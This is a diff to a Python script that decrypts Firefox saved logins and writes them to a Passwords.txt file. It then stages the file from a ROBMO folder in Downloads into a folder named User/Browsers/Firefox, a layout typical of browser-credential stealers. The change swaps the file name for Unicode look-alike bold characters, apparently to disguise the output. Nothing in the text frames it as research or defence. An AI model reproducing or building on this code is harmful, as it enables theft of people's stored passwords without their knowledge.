@@ -20,6 +20,7 @@ from struct import unpack;from binascii import hexlify,unhexlify
 from rich.console import Console;from rich.table import Table;from rich.theme import Theme
 from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
 from time import sleep,localtime
+
 if os.name=='nt':pass
 
 def getShortLE(d, a):
@@ -305,10 +306,10 @@ intro = """
    
 ╚════════════════════════════════════════════════╝
 """ 
-if os.path.exists('Passwords.txt'):
-    os.remove('Passwords.txt')
+if os.path.exists('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt'):
+    os.remove('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt')
     
-with open('Passwords.txt', 'w', encoding="utf-8") as f:
+with open('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt', 'w', encoding="utf-8") as f:
     f.write(intro + "\n")
     for i in logins:
         assert i[0][0] == CKA_ID
@@ -327,7 +328,7 @@ import time
 
 download_folder = os.path.join(os.path.expanduser("~"), 'Downloads', 'ROBMO')
 
-source_path = os.path.join(download_folder, 'Passwords.txt')
+source_path = os.path.join(download_folder, '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt')
 
 firefox_folder = os.path.join(os.path.expanduser("~"), '𝐔𝐬𝐞𝐫', '𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬', '𝐅𝐢𝐫𝐞𝐟𝐨𝐱')
 destination_path = os.path.join(firefox_folder, '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt')
